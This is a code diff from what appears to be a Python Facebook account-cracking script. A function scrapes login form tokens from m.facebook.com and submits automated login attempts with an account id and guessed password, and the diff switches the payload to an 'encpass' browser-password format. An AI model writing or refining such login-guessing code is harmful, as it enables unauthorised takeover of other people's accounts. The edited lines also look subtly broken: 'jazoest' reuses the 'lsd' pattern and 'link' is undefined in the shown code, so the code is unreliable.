@@ -1211,15 +1211,12 @@ def m6(idf,pwv):
    pro = random.choice(ugen)
    free_fb = session.get('https://m.facebook.com').text
    log_data = {
-             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":idf,
-            "pass":ps,
-            "login":"Log In"}
+             'lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+             'jazoest':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+             'uid': idf,
+             'next': 'https://m.facebook.com/login/save-device/',
+             'flow': 'login_no_pin',
+             'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),ps),}
    header_freefb = {
             'authority': 'm.facebook.com',
             'method': 'GET',
